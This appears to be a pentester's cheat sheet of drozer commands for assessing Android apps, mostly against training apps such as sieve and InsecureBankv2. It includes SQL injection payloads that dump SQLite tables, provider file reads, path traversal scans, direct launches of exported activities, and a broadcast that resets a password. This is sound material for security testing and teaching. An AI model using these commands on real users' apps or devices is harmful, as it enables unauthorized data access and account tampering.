#### Setup drozer
[Android Penetration Tools Walkthrough Series: Drozer - Infosec Resources (infosecinstitute.com)](https://resources.infosecinstitute.com/topic/android-penetration-tools-walkthrough-series-drozer/)

#### Get drozer shell
	`adb forward tcp:31415 tcp:31415`
	`drozer console connect`

#### Content Providers
- Get info from exposed content providers
	`run app.provider.info -a com.mwr.example.sieve`
	
** Note: content provider queries take the form `content://name.of.package.class/declared_name` **

- Drozer can guess and try several URIs
	`run scanner.provider.finduris -a com.mwr.example.sieve`
- Query Content Provider (database based)
	`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --vertical`
- Update and delete content provider (database based)
	[Exploiting Content Providers - HackTricks](https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers)
- Manual SQL Injection test
	`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"`
- Manual SQL Lite Dump
	`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"`
- Automatic SQL Discovery
	`run scanner.provider.injection -a com.mwr.example.sieve`
- Read Files
	`run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts`
- Automatic Path Traversal Discovery
	`run scanner.provider.traversal -a com.mwr.example.sieve`
	
	***
	
### Permissions 
- Examine Permissions and custom permissions
	`run app.package.info -a com.spotify.music`

#### Deep links
- pull invocable URIs(deep links/app links) from the AndroidManifest.xml file
	```
	run scanner.activity.browsable -a com.google.android.apps.messaging
	Package: com.google.android.apps.messaging
	  Invocable URIs:
		sms://
		mms://
	  Classes:
		com.google.android.apps.messaging.ui.conversation.LaunchConversationActivity
	```
	
- Call deeplinks
	`run app.activity.start  --action android.intent.action.VIEW --data-uri "sms://0123456789"`

### Exported IPC components
-  Enumerate exported
	`run app.package.attacksurface com.mwr.example.sieve`
- List exported content providers
	`run app.provider.finduri com.mwr.example.sieve`
- List exported Activities
	`run app.activity.info -a com.mwr.example.sieve`
- Launch Activity directly
	`run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList`
- List exported services
	`run app.service.info -a com.mwr.example.sieve`
- Interact with service
	`run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj`
- List broadcast recivers
	`run app.broadcast.info -a com.android.insecurebankv2`
- Send message to broadcast reciever
	`run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345`
- Sniff intents
	`run app.broadcast.sniff --action theBroadcast`
	

### Scan for all debuggable applications on a device
`run app.package.debuggable`